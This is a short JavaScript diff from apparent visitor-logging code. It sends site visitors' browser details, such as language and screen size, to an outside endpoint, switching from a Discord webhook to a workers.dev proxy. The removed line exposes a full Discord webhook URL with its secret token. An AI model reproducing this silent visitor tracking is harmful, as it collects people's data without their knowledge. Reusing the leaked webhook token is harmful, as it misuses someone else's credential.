@@ -51,11 +51,12 @@ Language: ${browserData.language}
 Screen: ${browserData.screenSize}
         `;
 
-        await fetch('https://discord.com/api/webhooks/1391480317751070791/Ur2MCf2AV3ouYVKkbR7fDorqPaM7krVHQnZ-0dGuMNjvYXlTxYXMX8cgoeMPIkBNhqBH', {
+        await fetch('https://discord-share.drxckpro123-346.workers.dev', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: message }),
+          body: JSON.stringify({ message }),
         });
+
       } catch (err) {
         console.error('Visitor info logging failed:', err);
       }
